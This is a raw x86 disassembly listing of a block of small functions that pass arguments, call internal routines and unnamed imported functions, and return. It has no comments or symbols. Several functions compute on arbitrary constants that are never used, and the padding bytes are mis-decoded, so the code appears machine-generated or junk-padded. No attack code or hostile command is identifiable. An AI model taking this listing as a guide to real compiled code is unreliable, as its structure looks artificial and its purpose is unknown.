  4d10de:	add    BYTE PTR [eax],al
  4d10e0:	pop    edi
  4d10e1:	call   DWORD PTR ds:0x4d2040
  4d10e7:	call   edi
  4d10e9:	add    BYTE PTR [eax],al
  4d10eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10f1:	sub    esp,0x3c
  4d10f4:	mov    eax,0x4d3078
  4d10f9:	xor    ecx,0xffffe725
  4d10ff:	push   eax
  4d1100:	lea    esi,[eax-0x78]
  4d1103:	push   esi
  4d1104:	call   0x4d129c
  4d1109:	add    esp,0x4
  4d110c:	test   eax,eax
  4d110e:	jne    0x4d1100
  4d1110:	pop    eax
  4d1111:	push   eax
  4d1112:	push   DWORD PTR [eax+0xd0]
  4d1118:	push   DWORD PTR [eax+0x194]
  4d111e:	call   0x4d1190
  4d1123:	add    esp,0x8
  4d1126:	pop    eax
  4d1127:	push   eax
  4d1128:	push   0x0
  4d112a:	call   0x4d0bc0
  4d112f:	add    esp,0x4
  4d1132:	pop    eax
  4d1133:	add    esp,0x3c
  4d1136:	pop    ebp
  4d1137:	ret    
  4d1138:	pop    edi
  4d1139:	call   DWORD PTR ds:0x4d2014
  4d113f:	call   edi
  4d1141:	add    BYTE PTR [eax],al
  4d1143:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1149:	sub    esp,0x30
  4d114c:	mov    edi,0x4d3004
  4d1151:	or     esi,DWORD PTR [ebp-0x14]
  4d1154:	push   edi
  4d1155:	push   eax
  4d1156:	push   DWORD PTR [edi+0x160]
  4d115c:	push   ebx
  4d115d:	call   0x4d124c
  4d1162:	add    esp,0xc
  4d1165:	pop    edi
  4d1166:	push   edi
  4d1167:	push   0x0
  4d1169:	call   0x4d1184
  4d116e:	add    esp,0x4
  4d1171:	pop    edi
  4d1172:	push   edi
  4d1173:	call   0x4d14ac
  4d1178:	add    esp,0x4
  4d117b:	pop    edi
  4d117c:	add    esp,0x30
  4d117f:	pop    ebp
  4d1180:	ret    
  4d1181:	add    BYTE PTR [eax],al
  4d1183:	add    BYTE PTR [edi-0x1],bl
  4d1186:	adc    eax,0x4d2024
  4d118b:	call   edi
  4d118d:	add    BYTE PTR [eax],al
  4d118f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1195:	sub    esp,0x34
  4d1198:	lea    esi,[eax-0x3c]
  4d119b:	xor    edx,DWORD PTR [ebp-0x24]
  4d119e:	push   esi
  4d119f:	push   DWORD PTR [esi+0x130]
  4d11a5:	push   ecx
  4d11a6:	call   0x4d1054
  4d11ab:	add    esp,0x8
  4d11ae:	pop    esi
  4d11af:	push   0x0
  4d11b1:	call   0x4d1240
  4d11b6:	add    esp,0x4
  4d11b9:	push   0x0
  4d11bb:	call   0x4d11e0
  4d11c0:	add    esp,0x4
  4d11c3:	add    esp,0x34
  4d11c6:	pop    ebp
  4d11c7:	ret    
  4d11c8:	pop    edi
  4d11c9:	call   DWORD PTR ds:0x4d2008
  4d11cf:	call   edi
  4d11d1:	add    BYTE PTR [eax],al
  4d11d3:	add    BYTE PTR [edi-0x1],bl
  4d11d6:	adc    eax,0x4d2044
  4d11db:	call   edi
  4d11dd:	add    BYTE PTR [eax],al
  4d11df:	add    BYTE PTR [edi-0x1],bl
  4d11e2:	adc    eax,0x4d201c
  4d11e7:	call   edi
  4d11e9:	add    BYTE PTR [eax],al
  4d11eb:	add    BYTE PTR [edi-0x1],bl
  4d11ee:	adc    eax,0x4d2058
  4d11f3:	call   edi
  4d11f5:	add    BYTE PTR [eax],al
  4d11f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11fd:	sub    esp,0x2c
  4d1200:	lea    edi,[ecx-0xa4]
  4d1206:	and    edx,0xffff9987
  4d120c:	push   edi
  4d120d:	mov    edi,0x0
  4d1212:	push   edi
  4d1213:	call   0x4d06f8
  4d1218:	add    esp,0x4
  4d121b:	pop    edi
  4d121c:	push   edi
  4d121d:	push   eax
  4d121e:	push   DWORD PTR [edi+0x1c8]
  4d1224:	call   0x4d1474
  4d1229:	add    esp,0x8
  4d122c:	pop    edi
  4d122d:	push   edi
  4d122e:	push   0x0
  4d1230:	call   0x4d14c4
  4d1235:	add    esp,0x4
  4d1238:	pop    edi
  4d1239:	add    esp,0x2c
  4d123c:	pop    ebp
  4d123d:	ret    
  4d123e:	add    BYTE PTR [eax],al
  4d1240:	pop    edi
  4d1241:	call   DWORD PTR ds:0x4d205c
  4d1247:	call   edi
  4d1249:	add    BYTE PTR [eax],al
  4d124b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1251:	sub    esp,0x4c
  4d1254:	mov    ebx,0x4d308c
  4d1259:	sub    DWORD PTR [ebx+0x80],ebx
  4d125f:	call   0x4d0a44
  4d1264:	add    esp,0x4
  4d1267:	push   ebx
  4d1268:	push   edi
  4d1269:	push   esi
  4d126a:	call   0x4d0b7c
  4d126f:	add    esp,0x8
  4d1272:	pop    ebx
  4d1273:	push   0x0
  4d1275:	call   0x4d1030
  4d127a:	add    esp,0x4
  4d127d:	add    esp,0x4c
  4d1280:	pop    ebp
  4d1281:	ret    
  4d1282:	add    BYTE PTR [eax],al
  4d1284:	pop    edi
  4d1285:	call   DWORD PTR ds:0x4d2090
  4d128b:	call   edi
  4d128d:	add    BYTE PTR [eax],al
  4d128f:	add    BYTE PTR [edi-0x1],bl
  4d1292:	adc    eax,0x4d2054
  4d1297:	call   edi
  4d1299:	add    BYTE PTR [eax],al
  4d129b:	add    BYTE PTR [edi-0x1],bl
  4d129e:	adc    eax,0x4d2010
  4d12a3:	call   edi
  4d12a5:	add    BYTE PTR [eax],al
  4d12a7:	add    BYTE PTR [edi-0x1],bl
  4d12aa:	adc    eax,0x4d20a0
  4d12af:	call   edi
  4d12b1:	add    BYTE PTR [eax],al
  4d12b3:	add    BYTE PTR [edi-0x1],bl
  4d12b6:	adc    eax,0x4d206c
  4d12bb:	call   edi
  4d12bd:	add    BYTE PTR [eax],al
  4d12bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12c5:	sub    esp,0x40
  4d12c8:	lea    ecx,[eax-0x14]
  4d12cb:	or     edi,DWORD PTR [ebp-0x18]
  4d12ce:	push   ecx
  4d12cf:	push   0x0
  4d12d1:	call   0x4d06f8
  4d12d6:	add    esp,0x4
  4d12d9:	pop    ecx
  4d12da:	push   ecx
  4d12db:	push   esi
  4d12dc:	push   eax
  4d12dd:	push   eax
  4d12de:	push   eax
  4d12df:	call   0x4d07ec
  4d12e4:	add    esp,0x10
  4d12e7:	pop    ecx
  4d12e8:	push   ecx
  4d12e9:	lea    esi,[ecx-0x124]
  4d12ef:	push   esi
  4d12f0:	call   0x4d129c
  4d12f5:	add    esp,0x4
  4d12f8:	test   eax,eax
  4d12fa:	jne    0x4d12e9
  4d12fc:	pop    ecx
  4d12fd:	add    esp,0x40
  4d1300:	pop    ebp
  4d1301:	ret    
  4d1302:	add    BYTE PTR [eax],al
  4d1304:	mov    edi,edi
  4d1306:	push   ebp
  4d1307:	mov    ebp,esp
  4d1309:	sub    esp,0x54
  4d130c:	lea    edx,[esi-0x74]
  4d130f:	adc    ecx,edi
  4d1311:	push   edx
  4d1312:	push   DWORD PTR [edx+0xe4]
  4d1318:	push   ebx
  4d1319:	call   0x4d0f74
  4d131e:	add    esp,0x8
  4d1321:	pop    edx
  4d1322:	push   edx
  4d1323:	mov    ecx,0x0
  4d1328:	push   ecx
  4d1329:	call   0x4d1184
  4d132e:	add    esp,0x4
  4d1331:	pop    edx
  4d1332:	push   edx
  4d1333:	mov    ecx,0x0
  4d1338:	push   ecx
  4d1339:	call   0x4d11e0
  4d133e:	add    esp,0x4
  4d1341:	pop    edx
  4d1342:	add    esp,0x54
  4d1345:	pop    ebp
  4d1346:	ret    
  4d1347:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d134d:	sub    esp,0x34
  4d1350:	lea    eax,[esi-0xfc]
  4d1356:	add    DWORD PTR [eax+0x30],0xffffff9d
  4d135a:	push   eax
  4d135b:	call   0x4d14ac
  4d1360:	add    esp,0x4
  4d1363:	pop    eax
  4d1364:	push   eax
  4d1365:	push   ebx
  4d1366:	push   DWORD PTR [eax+0x188]
  4d136c:	call   0x4d0a50
  4d1371:	add    esp,0x8
  4d1374:	pop    eax
  4d1375:	push   eax
  4d1376:	mov    ebx,0x0
  4d137b:	push   ebx
  4d137c:	call   0x4d1030
  4d1381:	add    esp,0x4
  4d1384:	pop    eax
  4d1385:	add    esp,0x34
  4d1388:	pop    ebp
  4d1389:	ret    
  4d138a:	add    BYTE PTR [eax],al
  4d138c:	mov    edi,edi
  4d138e:	push   ebp
  4d138f:	mov    ebp,esp
  4d1391:	sub    esp,0x3c
  4d1394:	lea    edi,[ecx-0x144]
  4d139a:	xor    DWORD PTR [edi-0x78],0xffffc499
  4d13a1:	push   edi
  4d13a2:	push   DWORD PTR [edi+0xb8]
  4d13a8:	push   ecx
  4d13a9:	push   DWORD PTR [edi+0x1e4]
  4d13af:	push   ebx
  4d13b0:	call   0x4d13d8
  4d13b5:	add    esp,0x10
  4d13b8:	pop    edi
  4d13b9:	push   edi
  4d13ba:	call   0x4d0a44
  4d13bf:	add    esp,0x4
  4d13c2:	pop    edi
  4d13c3:	push   edi
  4d13c4:	mov    edi,0x0
  4d13c9:	push   edi
  4d13ca:	call   0x4d11c8
  4d13cf:	add    esp,0x4
  4d13d2:	pop    edi
  4d13d3:	add    esp,0x3c
  4d13d6:	pop    ebp
  4d13d7:	ret    
  4d13d8:	mov    edi,edi
  4d13da:	push   ebp
  4d13db:	mov    ebp,esp
  4d13dd:	sub    esp,0x28
  4d13e0:	mov    ecx,0x4d3078
  4d13e5:	or     DWORD PTR [ebp-0x20],0xffffffb8
  4d13e9:	push   ecx
  4d13ea:	push   DWORD PTR [ecx+0x60]
  4d13ed:	push   DWORD PTR [ecx+0xa8]
  4d13f3:	push   DWORD PTR [ecx+0x4c]
  4d13f6:	call   0x4d0834
  4d13fb:	add    esp,0xc
  4d13fe:	pop    ecx
  4d13ff:	push   ecx
  4d1400:	mov    ecx,0x0
  4d1405:	push   ecx
  4d1406:	call   0x4d103c
  4d140b:	add    esp,0x4
  4d140e:	pop    ecx
  4d140f:	push   ecx
  4d1410:	call   0x4d14ac
  4d1415:	add    esp,0x4
  4d1418:	pop    ecx
  4d1419:	add    esp,0x28
  4d141c:	pop    ebp
  4d141d:	ret    
  4d141e:	add    BYTE PTR [eax],al
  4d1420:	pop    edi
  4d1421:	call   DWORD PTR ds:0x4d2070
  4d1427:	call   edi
  4d1429:	add    BYTE PTR [eax],al
  4d142b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1431:	sub    esp,0x38
  4d1434:	lea    edx,ds:0x4d311c
  4d143a:	sbb    DWORD PTR [ebp-0x20],esi
  4d143d:	push   edx
  4d143e:	push   ecx
  4d143f:	push   DWORD PTR [edx+0x58]
  4d1442:	push   edi
  4d1443:	push   DWORD PTR [edx+0x1c8]
  4d1449:	call   0x4d1098
  4d144e:	add    esp,0x10
  4d1451:	pop    edx
  4d1452:	push   edx
  4d1453:	mov    eax,0x0
  4d1458:	push   eax
  4d1459:	call   0x4d1030
  4d145e:	add    esp,0x4
  4d1461:	pop    edx
  4d1462:	push   edx
  4d1463:	push   0x0
  4d1465:	call   0x4d1030
  4d146a:	add    esp,0x4
  4d146d:	pop    edx
  4d146e:	add    esp,0x38
  4d1471:	pop    ebp
  4d1472:	ret    
  4d1473:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1479:	sub    esp,0x34
  4d147c:	lea    ebx,ds:0x4d3194
  4d1482:	sbb    edx,0xffffff94
  4d1485:	push   ebx
  4d1486:	push   eax
  4d1487:	push   edx
  4d1488:	push   esi
  4d1489:	call   0x4d142c
  4d148e:	add    esp,0xc
  4d1491:	pop    ebx
  4d1492:	push   0x0
  4d1494:	call   0x4d1240
  4d1499:	add    esp,0x4
  4d149c:	call   0x4d14ac
  4d14a1:	add    esp,0x4
  4d14a4:	add    esp,0x34
  4d14a7:	pop    ebp
  4d14a8:	ret    
  4d14a9:	add    BYTE PTR [eax],al
  4d14ab:	add    BYTE PTR [edi-0x1],bl
  4d14ae:	adc    eax,0x4d204c
  4d14b3:	call   edi
  4d14b5:	add    BYTE PTR [eax],al
  4d14b7:	add    BYTE PTR [edi-0x1],bl
  4d14ba:	adc    eax,0x4d2018
  4d14bf:	call   edi
  4d14c1:	add    BYTE PTR [eax],al
  4d14c3:	add    BYTE PTR [edi-0x1],bl
  4d14c6:	adc    eax,0x4d2004
  4d14cb:	call   edi
  4d14cd:	add    BYTE PTR [eax],al
  4d14cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d5:	sub    esp,0x5c
  4d14d8:	lea    edx,[edi+0x44]
  4d14db:	sub    DWORD PTR [edx-0x160],ebx
  4d14e1:	push   edx
  4d14e2:	push   0x0
  4d14e4:	call   0x4d14c4
  4d14e9:	add    esp,0x4
  4d14ec:	pop    edx
  4d14ed:	push   edx
  4d14ee:	push   edi
  4d14ef:	push   edi
  4d14f0:	push   eax
  4d14f1:	push   ebx
  4d14f2:	call   0x4d1510
  4d14f7:	add    esp,0x10
  4d14fa:	pop    edx
  4d14fb:	push   edx
  4d14fc:	mov    esi,0x0
  4d1501:	push   esi
  4d1502:	call   0x4d1184
  4d1507:	add    esp,0x4
  4d150a:	pop    edx
  4d150b:	add    esp,0x5c
  4d150e:	pop    ebp
  4d150f:	ret    
  4d1510:	mov    edi,edi
  4d1512:	push   ebp
  4d1513:	mov    ebp,esp
  4d1515:	sub    esp,0x1c
  4d1518:	mov    edi,0x4d3184
  4d151d:	add    edx,0x772c
  4d1523:	push   edi
  4d1524:	push   esi
  4d1525:	push   DWORD PTR [edi+0x1bc]
  4d152b:	push   DWORD PTR [edi+0x160]
  4d1531:	push   ebx
  4d1532:	call   0x4d0db0
  4d1537:	add    esp,0x10
  4d153a:	pop    edi
  4d153b:	push   edi
  4d153c:	mov    edi,0x0
  4d1541:	push   edi
  4d1542:	call   0x4d11e0
  4d1547:	add    esp,0x4
  4d154a:	pop    edi
  4d154b:	push   edi
  4d154c:	mov    edx,0x0
  4d1551:	push   edx
  4d1552:	call   0x4d11c8
  4d1557:	add    esp,0x4
  4d155a:	pop    edi
  4d155b:	add    esp,0x1c
  4d155e:	pop    ebp
  4d155f:	ret    
  4d1560:	mov    edi,edi
  4d1562:	push   ebp
  4d1563:	mov    ebp,esp
  4d1565:	sub    esp,0x38
  4d1568:	lea    edi,ds:0x4d316c
  4d156e:	adc    DWORD PTR [edi-0x124],0x45
  4d1575:	push   edi
  4d1576:	call   0x4d0a44
  4d157b:	add    esp,0x4
  4d157e:	pop    edi
  4d157f:	push   edi
  4d1580:	push   ecx
  4d1581:	push   DWORD PTR [edi+0x1bc]
  4d1587:	call   0x4d097c
  4d158c:	add    esp,0x8
  4d158f:	pop    edi
  4d1590:	push   edi
  4d1591:	mov    ecx,0x0
  4d1596:	push   ecx
  4d1597:	call   0x4d0bc0
  4d159c:	add    esp,0x4
  4d159f:	pop    edi
  4d15a0:	add    esp,0x38
  4d15a3:	pop    ebp
  4d15a4:	ret    
  4d15a5:	add    BYTE PTR [eax],al
	...
